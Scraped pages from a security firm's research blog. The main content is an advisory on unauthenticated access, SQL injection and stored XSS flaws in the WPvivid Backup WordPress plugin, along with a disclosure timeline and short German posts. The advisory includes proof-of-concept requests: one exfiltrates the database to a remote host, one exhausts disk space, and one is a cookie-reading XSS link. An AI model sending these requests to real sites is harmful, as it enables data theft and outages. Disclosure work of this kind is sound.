12.04.2019 – HiSolutions inquires if the last email
was received successfully. HiSolutions reminds Couchbase that the issue is
scheduled for disclosure on 21.05.2019 and request to be notified if more time
is needed by Couchbase.

15.04.2019 – Couchbase apologizes for the delayed
response. The patch for the Sync Gateway is expected at the end of April. Couchbase
agrees to a public disclosure on 21.05.2019. Couchbase informs HiSolutions that
they will list the issue on a changed website under <https://www.couchbase.com/resources/security> within a table containing all vulnerabilities, fix release dates, versions,
and affected products.

14.05.2019 – HiSolutions notices that the patch is
applied in the latest public version. HiSolutions sends an inquiry regarding
the vulnerability table on the website and if 21.05.2019 is still good for the
disclosure.

21.05.2019 – HiSolutions postpones the disclosure
because no answer was received.

11.06.2019 – HiSolutions inquires regarding the table
on the website and a new disclosure date. A delivery failure for the contact
address of the initial contact within the security team is received. The email is
resent to the security team with the request for an answer by another team
member.

12.06.2019 – Couchbase replies that the fix is
included in Sync Gateway v2.5 as well as in v2.1.3. The release notes for both
products will be updated in the following days to include a reference to the
vulnerability. Couchbase is actively working on the vulnerability table. While
unclear if the table will be finished until 21.06.2019, HiSolutions can
disclose the issue on 21.06.2019 if Couchbase has updated the release release
notes until then.

**Further references**

<https://docs.couchbase.com/dotnet-sdk/2.2/prepared-statements.html> <https://docs.couchbase.com/java-sdk/2.7/n1ql-query.html#devguide-named-placeholders>

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_402e7926_20250121_012420.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Autor: Denis Werner

Advisories/Disclosure
[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)](https://research.hisolutions.com/2024/01/multiple-vulnerabilities-in-wordpress-plugin-wpvivid-backup-and-migration/ "Multiple vulnerabilities in WordPress Plugin – WPvivid Backup and Migration")

[8. Januar 202429. Februar 2024](https://research.hisolutions.com/2024/01/multiple-vulnerabilities-in-wordpress-plugin-wpvivid-backup-and-migration/)[Advisories](https://research.hisolutions.com/category/advisories/), [Allgemein](https://research.hisolutions.com/category/allgemein/), [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/), [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/)
## [Multiple vulnerabilities in WordPress Plugin – WPvivid Backup and Migration](https://research.hisolutions.com/2024/01/multiple-vulnerabilities-in-wordpress-plugin-wpvivid-backup-and-migration/)

As part of a customer project, multiple vulnerabilities in the WordPress plugin [WPvivid Backup and Migration](https://wordpress.org/plugins/wpvivid-backuprestore/) (Free Edition) were identified and further investigated outside the project to determine the impact in more detail.

The vulnerabilities were identified in version 0.9.68 and probably exist in older versions as well. Upgrade the plugin WPvivid [Backup](https://research.hisolutions.com/2023/04/reddit-ausfall-nicht-nur-systeme-sondern-auch-die-menschen-aktuell-halten/) and Migration (Free Edition) to the version 0.9.69 or higher as soon as possible to fix the vulnerabilities.

## Background Information

[WPvivid Backup and Migration](https://wordpress.org/plugins/wpvivid-backuprestore/) is a WordPress plugin by [WPvivid Team](https://wpvivid.com/) and offers backup, migration, and staging as basic features. This plugin has more than 200,000 active installations.

## The vulnerabilities

Functions of the WPvivid Backup and Migration plugin in version 0.9.68 can be called remotely without authentication, which allows attackers to exfiltrate the entire WordPress database, for example, or to fill the hard disk of the corresponding system by multiple local copies of the WordPress pages disturbing their availability ([CVE-2024-1982](https://www.cve.org/CVERecord?id=CVE-2024-1982)).

Furthermore, SQL queries can be manipulated (SQL injection), which means that further database contents can probably be read or manipulated without authentication ([CVE-2024-1981](https://www.cve.org/CVERecord?id=CVE-2024-1981)).

The plugin is also vulnerable to stored cross-site scripting attacks . For this, a WordPress administrator must execute a manipulated link, for example. This vulnerability was simultaneously published by another researcher and is already tracked under [CVE-2021-24994](https://www.cve.org/CVERecord?id=CVE-2021-24994).

## Unauthenticated Access to WPvivid Functions (CVE-2024-1982)

The following plugin functions can be called unauthenticated e. g. over the Internet:

* `wp_ajax_nopriv_wpvivid_restore`
* `wp_ajax_nopriv_wpvivid_get_restore_progress`
* `wp_ajax_nopriv_wpvividstg_start_staging_free`
* `wp_ajax_nopriv_wpvividstg_get_staging_progress_free`

The function `wp_ajax_nopriv_wpvividstg_start_staging_free` can be used to trigger the creation of a staging web page. Selected or all files of the WordPress installation are copied into a definable subdirectory. This functionality can be started without prior authentication like this:

```
POST /wp-admin/admin-ajax.php?action=wpvividstg_start_staging_free HTTP/1.1
Host: myblog.hisocorp.com
[…]
Content-Type: application/x-www-form-urlencoded

path=custom_name_staging_page&table_prefix=something&custom_dir=something&additional_db={"test":"test"}&root_dir=0
```

Afterwards, the server response `{"result":"success","task_id":"wpvivid-61ba042730a63"}` indicates that the action was successful.

By continuously running this function to create staging versions of the web application an attacker can exhaust the systems disk space. Normal operation of the system and especially of the web application can thus no longer be provided.

By specifying a remote system in the parameters of the function `wp_ajax_nopriv_wpvividstg_start_staging_free`, the contents of the WordPress installation can be exfiltrated. This can be done as in the following example request:

```
POST /wp-admin/admin-ajax.php?action=wpvividstg_start_staging_free HTTP/1.1
Host: example.org
[…]
Content-Type: application/x-www-form-urlencoded

path=name_existing_staging_page&create_new_wp=1&additional_db={"additional_database_check":"1","additional_database_info":{"db_host":"192.168.0.5","db_name":"something","db_user":"username","db_pass":"password"}}&custom_dir={"database_check":1}&table_prefix=something
```

Afterwards, the status must be queried once via the function `wpvividstg_get_staging_progress_free`:

```
POST /wordpress/wp-admin/admin-ajax.php?action=wpvividstg_get_staging_progress_free HTTP/1.1
Host: myblog.hisocorp.com
Content-Type: application/x-www-form-urlencoded
```

Thus, an attacker can retrieve sensitive data from WordPress databases.

**Update:** The vendor fix in version 0.9.69 simply disables the `wpvividstg_start_staging_free` action, see code changes to `includes/staging/class-wpvivid-staging.php` [here](https://plugins.trac.wordpress.org/changeset?old_path=%2Fwpvivid-backuprestore%2Ftrunk&old=2667839&new_path=%2Fwpvivid-backuprestore%2Ftrunk&new=2667839&sfp_email=&sfph_mail=).

## SQL Injection in WPvivid Function (CVE-2024-1981)

The parameter `table_prefix` in the function `wpvividstg_start_staging_progress_free` appears to be vulnerable to an SQL injection. However, no more in-depth exploitability was performed as part of the research.

The following HTTP request was sent to the plugin function with the parameter value `test'`:

```
POST /wordpress/wp-admin/admin-ajax.php?action=wpvividstg_start_staging_free HTTP/1.1
Host: myblog.hisocorp.com
[…]
Content-Type: application/x-www-form-urlencoded

path=something&additional_db={"test":"test"}&custom_dir={"database_check":1}&table_prefix=test'

```

Subsequently, the status must be queried once via the function `wpvividstg_get_staging_progress_free`:

```
POST /wordpress/wp-admin/admin-ajax.php?action=wpvividstg_get_staging_progress_free HTTP/1.1
Host: myblog.hisocorp.com
Content-Type: application/x-www-form-urlencoded

```

It may happen that the status has to be queried several times until the following response containing the SQL exception is returned:

```
{"continue":0,"error":1,"error_msg":"Failed to create a table. Error:You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '` (\n  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,\n  `comment_id` b...' at line 1, query:CREATE TABLE `test'commentmeta` (\n  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,\n  `comment_id` bigint(20) unsigned NOT NULL DEFAULT 0,\n  `meta_key` varchar(255) DEFAULT NULL,\n  `meta_value` longtext DEFAULT NULL,\n  PRIMARY KEY (`meta_id`),\n  KEY `comment_id` (`comment_id`),\n  KEY `meta_key` (`meta_key`(191))\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4","log":"open log file failed","percent":50,"result":"success"}
```

**Update:** Here, the vendor fix in version 0.9.69 is the same as for the previous vulnerability. The `wpvividstg_get_staging_progress_free` action was simply disabled by commenting it out in `includes/staging/class-wpvivid-staging.php`, see [here](https://plugins.trac.wordpress.org/changeset?old_path=%2Fwpvivid-backuprestore%2Ftrunk&old=2667839&new_path=%2Fwpvivid-backuprestore%2Ftrunk&new=2667839&sfp_email=&sfph_mail=).

## Stored Cross Site Scripting (XSS) in WPvivid

**Update:** This vulnerability was also independently discovered and reported by another researcher and was assigned CVE-2021-24994 (published during the [responsible disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) process, see [here](https://wpscan.com/vulnerability/ea74257a-f6b0-49e9-a81f-53c0eb81b1da/)).

The plugin offers remote storage on a Google Drive. For this, an account (called Google Drive Remote Storage Account) for the corresponding authentication must be provided. The name of the specified account is included partially unfiltered in an onclick JavaScript area within the plugin. This means that arbitrary HTML and JavaScript code can be injected. This behavior allows stored [XSS](https://research.hisolutions.com/2023/04/xss-auf-abwegen/) attacks via the plugin web interface.

When a logged in WordPress administrator executes the following link, an account with the specified name is automatically stored in the plugin:

```
http://myblog.hisocorp.com/wp-admin/admin.php?page=WPvivid&action=wpvivid_google_drive_finish_auth&name=test2%22%20onload%3dalert(document.cookie)%3E&default=lll%27%22lll&auth_id
```

The payload passed in this example adds the JavaScript attribute `onload`, which is used to display the session cookies in an alert box:

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/01/poc.jpg)
## Responsible Disclosure Timeline

* 15.12.2021 – HiSolutions identified the vulnerabilities
* 14.01.2022 – HiSolutions contaced WPvivid Team via contact form
* 20.01.2022 – WPvivid Team responds and HiSolutions sends the details regarding the vulnerabilities
* 14.02.2022 – WPvivid Team provides the new version 0.9.69 in which the vulnerabilities should be fixed
* 01.03.2022 – HiSolutions tests the new version. The vulnerabilities were fixed.
* 29.02.2024 – The Wordfence CNA issues [CVE-2024-1981](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpvivid-backuprestore/wpvivid-backup-and-migration-0968-unauthenticated-sql-injection) and [CVE-2024-1982](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpvivid-backuprestore/wpvivid-backup-and-migration-0968-missing-authorization).
## Credits

The vulnerabilities were found by Denis Werner (HiSolutions AG). The fixes were reviewed by David Mathiszik (HiSolutions AG).

[![](data:image/gif;base64...)![](data:image/gif;base64...)![](data:image/gif;base64...)![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)](https://research.hisolutions.com/2023/01/vom-berater-bis-zum-angreifer-computer-uebernehmen-die-jobs/ "Vom Berater bis zum Angreifer: Computer übernehmen die Jobs")

[12. Januar 202312. Januar 2023](https://research.hisolutions.com/2023/01/vom-berater-bis-zum-angreifer-computer-uebernehmen-die-jobs/)[Allgemein](https://research.hisolutions.com/category/allgemein/), [Malware](https://research.hisolutions.com/category/themen/malware/), [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/)
## [Vom Berater bis zum Angreifer: Computer übernehmen die Jobs](https://research.hisolutions.com/2023/01/vom-berater-bis-zum-angreifer-computer-uebernehmen-die-jobs/)

Ende November gab die Firma OpenAI den Prototypen ihres Chatbots *[ChatGPT](https://research.hisolutions.com/2023/08/llms-sind-auch-nur-schuetzenswerte-informationen/)* zum Ausprobieren durch die Community frei und die nutzte die Adventszeit für viele spannende und teils erschreckende Experimente. Was ist ChatGPT eigentlich? Tatsächlich, wie der Name sagt, ein Chatbot, den man mit Fragen zu recht komplexen Antworten bringen kann. Wie in einem Fachgespräch üblich, kann man ihn durch weitere Fragen oder Änderungswünsche die Antworten ergänzen und verbessern lassen. Der Chatbot kann nicht nur Texte schreiben, sondern auch einfache Programme entwickeln.

Vorsicht ist jedoch angesagt, damit der Bot seine Ergebnisse nicht zu sehr nach den vermeintlichen Wünschen des Fragestellers ausrichtet. Bei Tests mit typischen Beratungsfragen, also den Fragen, die ohne Kontext immer mit „Es kommt darauf an“ beantwortet werden, konnte ChatPGT sehr überzeugend beide Sichten begründen – allerdings ohne auf die jeweils andere Option einzugehen. Fragt man beispielsweise, wie mit schwachen SSL-Cipher-Einstellungen umgegangen werden soll, bekommt man je nach Fragestellung diese Antworten:

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/01/OpenAI.jpg)

Für die Einordnung der Ergebnisse der künstlichen Intelligenz ist dann doch wieder Fachwissen nötig.

ChatGPT kann aus einer kurzen Beschreibung heraus auch ein passendes Programm entwickeln. Das interessiert natürlich auch potenzielle Malware-Autoren. Die Kollegen von Check-Point haben in Foren erste Hinweise in Foren gefunden, dass mit Malware aus ChatGPT-generiertem Code experimentiert wurde. Ob sich das Entwicklungsmodell bei den Malware-Autoren durchsetzt oder diese Malware am Ende sogar leichter erkennbar sind, wird die Zukunft zeigen.

<https://www.heise.de/news/ChatGPT-Maechtige-Waffe-in-Haenden-von-Skriptkiddies-7452741.html>

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2021/09/Schwachstellenreport-2021.png)](https://research.hisolutions.com/2021/09/hisolutions-schwachstellenreport-2021/ "HiSolutions Schwachstellenreport 2021")

[20. September 202111. August 2022](https://research.hisolutions.com/2021/09/hisolutions-schwachstellenreport-2021/)[Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/)
## [HiSolutions Schwachstellenreport 2021](https://research.hisolutions.com/2021/09/hisolutions-schwachstellenreport-2021/)

```
Hier gibt es unser Whitepaper [Schwachstellenreport](https://research.hisolutions.com/2023/04/unser-schwachstellenreport-was-wurde-besser-was-nicht/) 2021 zum [Download](https://research.hisolutions.com/wp-content/uploads/2021/10/Whitepaper-HiSolutions-Schwachstellenreport-2021.pdf).
```

Immer wieder taucht die Frage auf, wie die Ergebnisse von Penetrationstests im Vergleich mit „typischen“ Ergebnissen einzustufen sind und ob die identifizierten Probleme bei anderen Unternehmen in ähnlicher Form und Schwere bestehen.

Wir haben diese Fragen zum Anlass genommen, die von uns in den letzten Jahren durchgeführten Tests auszuwerten und die jeweils identifizierten Schwachstellen nach Schweregrad und Kategorien zu analysieren. Diese Aggregation erlaubt uns, sowohl die Vertraulichkeit der Projektergebnisse gegenüber unseren Kunden zu wahren als auch Aussagen über typische Testergebnisse und Problembereiche abzuleiten, die entweder besonders häufig auftauchen oder besonders schwerwiegende Lücken darstellen. Durch die Fortschreibung der Auswertung über die Jahre hinweg werden dabei auch interessante Trends und wichtige Entwicklungen in der Sicherheitslage deutlich.

## Vorgehen

Dieser Report beruht auf einer Auswertung der Ergebnisse aus insgesamt 89 Penetrations- und Schwachstellentests, die im Jahr 2020 durchgeführt wurden. Zusätzlich wurden die Befunde mit den Ergebnissen der Schwachstellenreports aus den Jahren 2013 bis 2019 verglichen.

Die durchgeführten Tests betreffen verschiedene Zielumgebungen von Netzwerkinfrastrukturen über Web-Anwendungen bis hin zu einzelnen Systemen und Verfahren, weswegen sie nicht direkt miteinander vergleichbar sind. Durch die Kategorienbildung bei den Schwachstellen lassen sich dennoch interessante Beobachtungen ableiten.

